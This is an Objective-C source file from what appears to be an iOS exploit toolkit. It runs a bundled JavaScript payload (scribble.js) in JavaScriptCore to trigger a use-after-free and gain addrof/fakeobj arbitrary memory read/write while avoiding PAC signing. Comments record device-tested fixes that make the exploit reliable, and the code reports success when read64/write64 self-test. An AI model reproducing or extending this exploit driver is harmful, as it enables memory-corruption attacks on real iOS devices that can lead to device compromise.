#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <JavaScriptCore/JavaScriptCore.h>
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <mach-o/loader.h>
#import <string.h>
#import <stdio.h>
#import "Modules.h"
#import "AppDelegate.h"
#import "Util.h"

// ===========================================================================
// JSC read/write from addrof+fakeobj, without forging any PAC signature
// (the DarkSword "scribble" route, proven on iOS 26.1 with this same CVE).
//
// The script itself is Resources/scribble.js -- loaded, never inlined, so the
// Objective-C lexer never sees JS.
//
// Runs in a JSContext (JavaScriptCore inside OUR process) -- NOT a WKWebView:
// on this build WebKit2 refuses to initialise inside a sideloaded app
// (SIGTRAP in WebKit::InitializeWebKit2), while JavaScriptCore works fine and the
// UAF trigger is pure JS with no DOM dependency.
//
// Two hard lessons from the device are built in here:
//
//  1. The script NEVER lets an exception escape to Objective-C.  Every phase
//     runs inside guard(); a RangeError from the deep GC-recursion warmup or a
//     TypeError from a mistyped slot used to abort the whole script, land in
//     [ctx exception], and then -[JSValue toString] handed back an object
//     whose description path BRKs in objc_opt_respondsToSelector (SIGTRAP) --
//     the app died with no verdict at all.  Now the script always ends with
//     JSON.stringify(), so Objective-C only ever sees a plain NSString, taken
//     through the sanctioned toObject bridge rather than a JS re-entry.
//
//  2. The trigger hunt is wall-clock bounded (150 s) and reports live progress,
//     because the per-round cost is ~10M JS calls and the loop allowed 10000
//     rounds: it used to grind for many minutes and "hang" the module.
// ===========================================================================

// Run JS in a JSContext (JavaScriptCore, no WebKit2).  Returns the string result.
// aveStep() is exported into the context so the script can report live progress
// into the device log while it runs.
static NSString *RunJS(NSString *src, NSString *tag) {
    @autoreleasepool {
        JSContext *ctx = [[JSContext alloc] init];
        NSString *res = @"(no answer)";
        ctx[@"aveStep"] = ^(id s) {
            NSString *line = [s isKindOfClass:[NSString class]] ? s : @"?";
            AveLog([NSString stringWithFormat:@"    js. %@", line]);
            AvePost([NSString stringWithFormat:@"%@ STEP %@", tag, line]);
        };
        @try {
            JSValue *v = [ctx evaluateScript:src];
            JSValue *exc = [ctx exception];
            if (exc) {
                // toObject() is the sanctioned bridge and does not re-enter JS
                // the way -[JSValue toString] does (which used to BRK).
                id o = [exc toObject];
                res = [o isKindOfClass:[NSString class]] ? o : [o description];
            } else if (v) {
                if ([v isKindOfClass:[NSString class]]) res = v;
                else {
                    id o = [v toObject];
                    res = [o isKindOfClass:[NSString class]] ? o : [o description];
                }
            }
        } @catch (NSException *e) {
            res = [NSString stringWithFormat:@"exception %@", e.reason];
        }
        ctx = nil;
        if (![res isKindOfClass:[NSString class]]) res = @"(no answer)";
        return res;
    }
}

NSString *ModJscScribbleRW(void) {
    AveLog(@"    JSC scribble R/W: DarkSword route from scribble.js (no WKWebView)");
    NSString *src = LoadJS(@"scribble.js");
    if (!src) {
        AvePost(@"SCRIBBLE scribble.js missing from the bundle");
        return @"scribble.js missing from the bundle";
    }
    NSString *r = RunJS(src, @"SCRIBBLE");
    AveLog([NSString stringWithFormat:@"    scribble result: %@", r]);
    AvePost([NSString stringWithFormat:@"SCRIBBLE %@", r]);
    char q = '"';
    NSString *wok = [NSString stringWithFormat:@"%cwrite%c:true", q, q];
    NSString *rok = [NSString stringWithFormat:@"%cread%c:true", q, q];
    if ([r containsString:wok] && [r containsString:rok]) {
        AveSetStatus(@"arbitrary R/W ACTIVE in our own process, no PAC needed");
        return @"ARBITRARY R/W ACTIVE on 23C5027f: read64/write64 self-tested";
    }
    return r;
}
